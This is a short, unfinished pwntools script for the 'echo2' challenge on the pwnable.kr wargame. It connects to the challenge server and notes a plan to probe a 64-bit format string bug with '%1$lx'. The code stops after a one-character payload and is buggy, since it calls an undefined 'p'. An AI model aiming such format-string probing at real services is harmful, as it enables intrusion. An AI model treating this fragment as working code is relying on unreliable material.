from pwn import *

r = remote("pwnable.kr", 9011)

"""
Exploit echo2 succeed in local.
Apply it remote environment!!
First I need to test FSB-64bit using "%1$lx"
"""


def select_menu(num):
    print(p.recvuntil(b"> "))
    r.sendline(num.encode())

pay = "%"
select_menu("2")